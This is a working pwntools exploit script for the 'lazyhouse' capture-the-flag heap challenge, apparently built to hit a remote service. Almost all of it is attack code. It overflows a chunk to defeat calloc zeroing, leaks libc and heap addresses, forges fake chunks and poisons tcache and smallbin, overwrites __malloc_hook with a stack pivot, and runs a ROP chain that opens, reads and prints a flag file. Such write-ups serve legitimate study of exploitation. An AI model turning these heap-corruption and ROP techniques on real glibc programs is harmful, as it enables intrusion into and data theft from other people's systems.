#!/usr/bin/env python2

from pwn import *

BINARY = './lazyhouse'
HOST, PORT = '3.115.121.123', 5731

elf = ELF('./lazyhouse')
libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def get_money():
	p.sendlineafter(': ', '1')
	p.sendlineafter(':', '0')
	p.sendlineafter(':', str(0x12c9fb4d812cbff))

	sell(0)

def buy(idx, size, content):
	p.sendlineafter(': ', '1')
	p.sendlineafter(':', str(idx))
	p.sendlineafter(':', str(size))
	p.sendafter(':', content)

def show(idx):
	p.sendlineafter(': ', '2')
	p.sendlineafter(':', str(idx))

def sell(idx):
	p.sendlineafter(': ', '3')
	p.sendlineafter(':', str(idx))

def upgrade(idx, content):
	p.sendlineafter(': ', '4')
	p.sendlineafter(':', str(idx))
	p.sendafter(':', content)

def super_house(content):
	p.sendlineafter(': ', '5')
	p.sendafter(':', content)

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = start()

get_money()

buy(0, 0x80, 'A'*0x80)
buy(1, 0x500, 'B'*0x500) # Chunk B
buy(2, 0x80, 'C'*0x80) # Prevent consolidation with top chunk

# Sell chunk B and move it to large bin
sell(1)
buy(1, 0x600, 'A'*0x600) # Move to large bin

# Overflow to turn on the IS_MMAPPED bit of chunk B
# This prevents calloc from clearing the chunk when we reallocate it
# Relevant code from __libc_calloc below:
'''
 /* Two optional cases in which clearing not necessary */
  if (chunk_is_mmapped (p))
    {
      if (__builtin_expect (perturb_byte, 0))
        return memset (mem, 0, sz);

      return mem;
    }
'''
upgrade(0, '\x00'*0x88 + p64(0x513))

# Get libc and heap leak
buy(7, 0x500, 'A'*8)

show(7)
data = p.recv(0x18)

libc.address = u64(data[8:16]) - 0x1e50d0
heap = u64(data[16:32]) - 0x2e0

pop_rdi = libc.address + 0x26542
pop_rsi = libc.address + 0x26f9e
pop_rdx = libc.address + 0x12bda6
pop_rax = libc.address + 0x47cf8
syscall = libc.address + 0xcf6c5
infinite_jmp = libc.address + 0x36784
malloc_hook = libc.symbols['__malloc_hook']
leave_ret = libc.address + 0x58373

log.info('Libc base: ' + hex(libc.address))
log.info('Heap base: ' + hex(heap))

sell(0) # goes into tcache
sell(1) # merges with top chunk
sell(2) # goes into tcache

target = heap + 0x8b0
log.info('target: ' + hex(target))
log.info('Top chunk consolidated at: ' + hex(heap+0x890))

# Create a fake 0x230 sized chunk within a new chunk
buy(6, 0x80, '\x00'*8 + p64(0x231)+p64(target-0x18)+p64(target-0x10)+p64(target-0x20))

buy(5, 0x80, 'C'*0x80)
buy(0, 0x80, 'D'*0x80)
buy(1, 0x80, 'E'*0x80)

buy(2, 0x600, '\x00'*0x508+p64(0x101)) # Fake chunk

# Set prev size to go back to the fake 0x230 chunk
# Clear prev inuse bit of the 0x600 sized chunk
upgrade(1, '\x00'*0x80 + p64(0x230) + p64(0x610))

# 0x600 chunk will now be freed and consolidated back to the fake 0x230 sized chunk
# Top chunk is right after this, so top chunk is consolidated all the way back too
sell(2)

# Index 5 will be the 0x6c1 sized fake chunk in the payload
chunk_payload = '\x00'*0x78+flat(0x6c1, [0]*17, 0x31, [0]*5, 0x61, [0]*11, 0x21, [0]*3, 0x71, [0]*13)
buy(2, 0x500, chunk_payload)

sell(0) # Free 0x30 sized chunk
sell(1) # Free 0x20 sized chunk
sell(2) # Free the fake 0x500 sized chunk

buy(0, 0x1a0, p64(0)*15+p64(0x6c1))
buy(1, 0x210, 'A'*0x210)

buy(2, 0x210, 'B'*0x210)
sell(2) # Send to tcache

buy(2, 0x210, '\x00'*0x148+p64(0xd1))
sell(2) # Send to tcache

# Fill the 0x220 tcache bin
for i in range(5):
	buy(2, 0x210, 'a')
	sell(2)

buy(2, 0x3a0, 'A'*0x3a0)
sell(2) # Send to tcache

sell(1) # 0x210 chunk goes into unsorted bin
buy(1, 0x220, 'A'*0x210) # Send 0x210 chunk to smallbin
sell(5) # Free the fake 0x6c1 sized chunk into unsorted bin

smallbin = libc.address + 0x1e4eb0
super_chunk_ptr = heap+0x40

buy(5, 0x6b0, '\x00'*0xa0 + p64(heap+0x40) + '\x00'*0x80 + p64(0x221) + p64(smallbin) + p64(heap+0x40))

sell(1) # This chunk isn't needed

buy(1, 0x210, 'Z'*0x18+flat(
	'/home/vagrant/flag'.ljust(0x20, '\x00'),
	pop_rdi, heap+0xa88-0x20, pop_rsi, 0, pop_rax, 2, syscall,
	pop_rdi, 3, pop_rsi, heap, pop_rdx, 0x100, pop_rax, 0, syscall,
	pop_rdi, 1, pop_rsi, heap, pop_rdx, 0x100, pop_rax, 1, syscall,
	infinite_jmp
))

buy(2, 0x210, p64(0)*0x20 + p64(malloc_hook))
super_house(p64(leave_ret)) # __mpn_mul_n+83

if args.GDB:
	debug([0x1d9e])

# RBP Is set to the second argument here
buy(4, heap+0xa80, 'A')

p.interactive()